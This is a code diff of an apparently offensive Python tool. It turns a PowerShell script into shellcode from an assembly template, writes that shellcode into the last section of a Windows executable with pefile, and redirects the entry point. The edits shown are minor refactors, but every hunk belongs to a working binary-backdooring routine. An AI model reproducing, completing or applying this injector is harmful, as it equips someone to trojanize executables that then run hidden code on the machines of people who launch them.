@@ -74,14 +74,16 @@ def extractShellcode(filename):
 
 def craftShellcode(scriptPath):
     '''write the ps script to an asm file and compile it to create shellcode'''
+    '''structure for 64-bit PEB is taken from here:
+    https://ntopcode.wordpress.com/2018/02/26/anatomy-of-the-process-environment-block-peb-windows-internals/'''
 
     print("[*] Reading powershell script")
-    script = ""
     with open(scriptPath, "r") as f:
         script = f.read().strip('\n')
 
     #Read shellcode template from file
-    asmTemplate = open("template.S", "r").read()
+    with open("template.S", "r") as f:
+        asmTemplate = f.read()
 
     #compile the shellcode to a COFF file then extract it
     print("[*] Compiling shellcode")
@@ -100,7 +102,6 @@ def injectShellcode(fileName, shellcode):
 
     pe = pefile.PE(fileName)
     rawOffset = pe.sections[pe.FILE_HEADER.NumberOfSections - 1].PointerToRawData
-    #print(pe.sections[pe.FILE_HEADER.NumberOfSections - 1].Name)
     pe.set_bytes_at_offset(rawOffset, shellcode)
 
     print("[*] Changing entry point")
